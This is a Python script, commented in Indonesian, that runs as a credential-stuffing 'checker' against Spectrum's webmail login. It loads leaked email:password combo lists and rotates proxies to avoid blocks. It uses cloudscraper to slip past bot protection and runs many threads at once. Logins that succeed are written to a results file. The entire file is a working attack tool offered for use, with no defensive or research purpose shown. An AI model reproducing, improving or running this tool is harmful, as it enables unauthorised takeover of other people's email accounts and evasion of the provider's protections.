import cloudscraper
import random
import time
import os
import sys
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from colorama import Fore, init

init(autoreset=True)
print_lock = threading.Lock()

class ValosintChecker:
    def __init__(self):
        self.valid_count = 0
        self.bad_count = 0
        self.logo = f"""
{Fore.CYAN}    ____   ____  _     _       ____   ____  _  _  _____ 
{Fore.CYAN}   |    \\ |    || |   | |     |    | |    || || ||_   _|
{Fore.CYAN}   |  |  ||  |  || |   | |     |  |  ||  |  || || |  | |  
{Fore.CYAN}   |  |  ||  |  || |___| |___  |  |  ||  |  || || |  | |  
{Fore.CYAN}   |____/ |____||_____|_____| |____/ |____||_||_|  |_|  
{Fore.YELLOW}   =====================================================
{Fore.WHITE}   [+] NAME    : VALOSINT CHECKER ID (PROXY EDITION)
{Fore.WHITE}   [+] SAVE TO : {Fore.GREEN}results/live.txt
{Fore.YELLOW}   =====================================================
        """

    def _get_time(self):
        return datetime.now().strftime("%H:%M:%S")

    def check_account(self, credential, proxies):
        if ":" not in credential: return
        email, password = credential.split(":")
        
        # Ambil proxy secara acak dari list
        px = random.choice(proxies) if proxies else None
        px_map = {"http": f"http://{px}", "https": f"http://{px}"} if px else None
        
        try:
            target_url = "https://webmail.spectrum.net/index.php/mail/auth"
            scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows'})
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

            # Get token dengan proxy
            res_get = scraper.get(target_url, headers=headers, proxies=px_map, timeout=10)
            soup = BeautifulSoup(res_get.text, 'html.parser')
            token_input = soup.find('input', {'type': 'hidden'})
            token = token_input['value'] if token_input else ""

            # Post login dengan proxy
            payload = {'email': email, 'password': password, 'token': token, 'login': 'submit'}
            res = scraper.post(target_url, data=payload, headers=headers, proxies=px_map, timeout=10)

            ts = self._get_time()
            
            with print_lock:
                if res.status_code == 200 and any(x in res.url.lower() for x in ["dashboard", "mail", "inbox"]):
                    print(f"{Fore.GREEN}[{ts}] [LIVE] {email} | IP: {px}")
                    # ==========================================
                    # BAGIAN INI YANG OTOMATIS NYIMPEN KE FILE
                    # ==========================================
                    with open("results/live.txt", "a") as f: 
                        f.write(f"{email}:{password}\n")
                    self.valid_count += 1
                else:
                    alasan = "Wrong Pass" if "invalid" in res.text.lower() else "Blocked by System"
                    print(f"{Fore.RED}[{ts}] [DIE]  {email} | {alasan}")
                    self.bad_count += 1
                    
        except Exception as e:
            with print_lock:
                print(f"{Fore.YELLOW}[{self._get_time()}] [ERROR] {email} | Proxy {px} Mati/Lemot")

    def start(self):
        os.system('clear')
        print(self.logo)
        
        # Bikin folder results otomatis kalau belum ada
        if not os.path.exists("results"): 
            os.makedirs("results")

        combo_file = input(f"{Fore.WHITE}Masukkan File Combo (email:pass): ")
        proxy_file = input(f"{Fore.WHITE}Masukkan File Proxy (ip:port) : ")
        thread_input = input(f"{Fore.WHITE}Jumlah Thread (cth: 10)      : ")
        
        if not os.path.exists(combo_file):
            print(f"{Fore.RED}[!] File Combo tidak ditemukan!")
            return

        threads = int(thread_input) if thread_input.isdigit() else 5
        accounts = [l.strip() for l in open(combo_file, 'r', encoding='utf-8') if ":" in l]
        
        if os.path.exists(proxy_file):
            proxies = [l.strip() for l in open(proxy_file, 'r', encoding='utf-8')]
            print(f"{Fore.GREEN}[+] Berhasil memuat {len(proxies)} Proxy.")
        else:
            print(f"{Fore.RED}[!] File Proxy tidak ditemukan! Wajib pakai proxy biar gak ke-block.")
            return

        print(f"\n{Fore.YELLOW}[*] Menjalankan Checker dengan {threads} Thread...\n")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for acc in accounts:
                executor.submit(self.check_account, acc, proxies)

        print(f"\n{Fore.CYAN}=====================================================")
        print(f"{Fore.GREEN}VALID: {self.valid_count} | {Fore.RED}DIE: {self.bad_count}")
        print(f"{Fore.WHITE}Cek hasil akun LIVE di folder: {Fore.GREEN}results/live.txt")

if __name__ == "__main__":
    ValosintChecker().start()
